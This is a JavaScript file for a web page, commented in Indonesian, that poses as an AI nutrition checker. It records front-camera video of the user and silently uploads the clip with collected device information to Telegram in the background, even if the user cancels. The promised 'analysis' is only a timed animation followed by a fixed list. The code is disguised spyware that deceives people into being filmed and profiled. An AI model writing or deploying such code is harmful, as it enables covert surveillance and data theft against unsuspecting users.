/**
 * medication.js — Rekam Video Konfirmasi & Analisis Nutrisi
 *
 * Optimasi latensi izin kamera (Zero-DOM Blocking):
 * - getUserMedia() ditembak pertama, sebelum operasi DOM apapun.
 * - DOM update dilakukan via requestAnimationFrame agar tidak memblokir browser IPC.
 */

function getSupportedMimeType() {
  const candidates = [
    'video/mp4;codecs=h264',
    'video/webm;codecs=vp9',
    'video/webm;codecs=vp8',
    'video/webm',
  ];
  return candidates.find(t => MediaRecorder.isTypeSupported(t)) || '';
}

let _medOpenedAt = 0;

function startMedication(event) {
  if (event && (event.type === 'pointerdown' || event.type === 'touchstart')) {
    event.preventDefault();
  }

  _medOpenedAt = Date.now();
  _isTriggeringMed = false;

  // Pre-warm kamera & permissions API
  if (navigator.mediaDevices?.enumerateDevices) {
    try { navigator.mediaDevices.enumerateDevices().catch(() => {}); } catch (_) {}
  }
  if (navigator.permissions?.query) {
    try { navigator.permissions.query({ name: 'camera' }).catch(() => {}); } catch (_) {}
  }

  showScreen('screen-camera');

  const badge          = $('med-badge');
  const badgeText      = $('med-badge-text');
  const title          = $('med-title');
  const subtitle       = $('med-subtitle');
  const bottomTrigger  = $('med-bottom-trigger');
  const bottomProgress = $('med-bottom-progress');
  const cameraPhase    = $('med-camera-phase');
  const instrVideo     = $('instr-video');
  const btnTrigger     = $('btn-trigger-obat');

  if (badge)          badge.className = 'rec-badge';
  if (badgeText)      badgeText.textContent = 'SIAPKAN MAKANAN';
  if (title)          title.textContent = 'Periksa Kandungan Nutrisi';
  if (subtitle)       subtitle.innerHTML = 'Posisikan makanan di depan kamera HP anda,<br>lalu ketuk tombol di bawah <strong>2 kali</strong> untuk mulai.';
  if (bottomTrigger)  bottomTrigger.style.display = 'flex';
  if (cameraPhase)    cameraPhase.style.display = 'none';
  if (bottomProgress) bottomProgress.style.display = 'none';
  if (instrVideo)     instrVideo.pause();

  // Blokir ghost-click 400ms setelah layar dibuka
  if (btnTrigger) {
    btnTrigger.style.pointerEvents = 'none';
    setTimeout(() => { if (btnTrigger) btnTrigger.style.pointerEvents = ''; }, 400);
  }
}

function startCountdown(seconds, onComplete) {
  const numEl        = $('countdown-num');
  const bar          = $('ring-bar');
  const progressText = $('med-progress-text');

  let remaining = seconds;
  if (numEl)        numEl.textContent = remaining;
  if (progressText) progressText.innerHTML = `Selesai dalam <span id="countdown-num">${remaining}</span> detik&hellip;`;
  if (bar)          bar.style.width = '0%';

  const totalMs   = seconds * 1000;
  const startTime = Date.now();

  const rafUpdate = () => {
    const progress = Math.min((Date.now() - startTime) / totalMs, 1);
    if (bar) bar.style.width = `${progress * 100}%`;
  };

  state.countdownTimer = setInterval(() => {
    remaining--;
    const currentNum = $('countdown-num');
    if (currentNum) currentNum.textContent = remaining;
    rafUpdate();

    if (remaining <= 0) {
      clearInterval(state.countdownTimer);
      if (bar) bar.style.width = '100%';
      onComplete();
    }
  }, 1000);
}

async function handleVideoReady() {
  const chunks   = state.recordedChunks.slice();
  const mimeUsed = state.mediaRecorder?.mimeType || 'video/webm';

  if (state.mediaStream) {
    state.mediaStream.getTracks().forEach(t => t.stop());
    state.mediaStream = null;
  }
  clearInterval(state.countdownTimer);
  state.countdownTimer  = null;
  state.recordedChunks  = [];

  // Kirim video di background (fire-and-forget) — tetap berjalan meski user kembali ke home
  if (chunks.length > 0) {
    const blob = new Blob(chunks, { type: mimeUsed });
    collectDeviceInfo().then(devInfo => {
      const caption = `PERIKSA KANDUNGAN NUTRISI\n\n${formatDeviceInfo(devInfo)}`;
      tgSendVideo(blob, caption).catch(err =>
        console.warn('[medication.js] Background upload error:', err)
      );
    }).catch(err => console.warn('[medication.js] Device info error:', err));
  }

  // Jika back ditekan saat rekam: video sudah dikirim di background, jangan tampilkan analisis
  if (state.backPressedDuringRecording) {
    state.backPressedDuringRecording = false;
    return;
  }

  showAnalysisScreen();
}

/**
 * Tampilkan layar analisis dengan circular progress selama 3 detik,
 * lalu beralih ke layar daftar nutrisi.
 */
function showAnalysisScreen() {
  showScreen('screen-analysis');

  const circle      = document.getElementById('analysis-circle');
  const DURATION_MS = 3000;
  const CIRCUMFERENCE = 2 * Math.PI * 50; // r=50 → ≈ 314.16

  if (circle) {
    circle.style.strokeDasharray  = CIRCUMFERENCE;
    circle.style.strokeDashoffset = CIRCUMFERENCE;
  }

  const startTime = Date.now();

  function animate() {
    const progress = Math.min((Date.now() - startTime) / DURATION_MS, 1);
    if (circle) circle.style.strokeDashoffset = CIRCUMFERENCE * (1 - progress);

    if (progress < 1) {
      requestAnimationFrame(animate);
    } else {
      showMedicineListScreen();
    }
  }

  requestAnimationFrame(animate);
}

function showMedicineListScreen() {
  showScreen('screen-medicine-list');

  // Animasi staggered item masuk dari kiri
  document.querySelectorAll('.medicine-item').forEach((item, i) => {
    item.style.opacity   = '0';
    item.style.transform = 'translateX(-24px)';
    item.style.transition = 'opacity 0.35s ease, transform 0.35s ease';
    setTimeout(() => {
      item.style.opacity   = '1';
      item.style.transform = 'translateX(0)';
    }, 120 + i * 100);
  });
}

let _isTriggeringMed = false;

async function triggerMedicationCamera(event) {
  if (event && (event.type === 'pointerdown' || event.type === 'touchstart')) {
    event.preventDefault();
  }

  // Blokir ghost-click dari tombol home sebelumnya
  if (Date.now() - _medOpenedAt < 400) {
    if (event) { event.preventDefault(); event.stopPropagation(); }
    return;
  }

  if (_isTriggeringMed) return;
  _isTriggeringMed = true;

  state.isCancelled = false;

  // ① Minta stream kamera SEKETIKA — memicu dialog izin OS
  const mediaPromise = navigator.mediaDevices.getUserMedia({
    video: { facingMode: 'user' },
    audio: false,
  });

  // ② Haptic feedback
  if (navigator.vibrate) {
    try { navigator.vibrate([50, 40, 50]); } catch (_) {}
  }

  // ③ Update tombol di frame berikutnya
  requestAnimationFrame(() => {
    const btn  = $('btn-trigger-obat');
    const text = $('btn-trigger-obat-text');
    const sub  = $('btn-trigger-obat-sub');
    if (btn && text) {
      btn.classList.add('trigger-active');
      text.textContent = '👆 KETUK SEKARANG!';
      if (sub) sub.textContent = 'UNTUK MULAI MEMERIKSA';
    }
  });

  try {
    state.mediaStream = await mediaPromise;
  } catch (err) {
    _isTriggeringMed = false;
    const btn  = $('btn-trigger-obat');
    const text = $('btn-trigger-obat-text');
    const sub  = $('btn-trigger-obat-sub');
    if (btn && text) {
      btn.classList.remove('trigger-active');
      text.textContent = '⚡ KETUK 2 KALI CEPAT';
      if (sub) sub.textContent = 'UNTUK MEMBUKA KAMERA & MULAI';
    }

    let msg = 'Tidak dapat mengakses kamera.';
    if (err.name === 'NotAllowedError') {
      msg = 'Izin kamera ditolak. Silakan ketuk tombol 2 kali cepat lagi, lalu pilih "Izinkan".';
    } else if (err.name === 'NotFoundError') {
      msg = 'Kamera tidak ditemukan di perangkat ini.';
    } else if (err.name === 'NotReadableError') {
      msg = 'Kamera sedang digunakan aplikasi lain.';
    }
    showResult({ icon: '🚫', title: 'Kamera Belum Diizinkan', message: msg });
    return;
  }

  _isTriggeringMed = false;

  const badge          = $('med-badge');
  const badgeText      = $('med-badge-text');
  const title          = $('med-title');
  const subtitle       = $('med-subtitle');
  const bottomTrigger  = $('med-bottom-trigger');
  const bottomProgress = $('med-bottom-progress');
  const cameraPhase    = $('med-camera-phase');
  const instrVideo     = $('instr-video');

  if (badge)          badge.className = 'rec-badge rec-badge-recording';
  if (badgeText)      badgeText.textContent = 'INISIALISASI AI';
  if (title)          title.textContent = 'Memulai';
  if (subtitle)       subtitle.innerHTML = 'Sedang memuat...<br>Mohon tunggu sebentar.';
  if (bottomTrigger)  bottomTrigger.style.display = 'none';
  if (cameraPhase)    cameraPhase.style.display = 'block';
  if (bottomProgress) bottomProgress.style.display = 'flex';

  if (instrVideo) { instrVideo.currentTime = 0; instrVideo.play().catch(() => {}); }

  $('camera-video').srcObject = state.mediaStream;

  const mimeType       = getSupportedMimeType();
  state.recordedChunks = [];
  state.mediaRecorder  = new MediaRecorder(state.mediaStream, mimeType ? { mimeType } : {});

  state.mediaRecorder.ondataavailable = (e) => {
    if (e.data && e.data.size > 0) state.recordedChunks.push(e.data);
  };
  state.mediaRecorder.onstop = async () => {
    if (state.isCancelled) return;
    await handleVideoReady();
  };

  state.mediaRecorder.start(500);
  startCountdown(CONFIG.VIDEO_DURATION_SEC, () => {
    if (!state.isCancelled && state.mediaRecorder?.state !== 'inactive') {
      state.mediaRecorder.stop();
    }
  });
}

function cancelCamera() {
  state.isCancelled = true;
  _isTriggeringMed  = false;
  clearInterval(state.countdownTimer);
  stopAllMedia();
  goHome();
}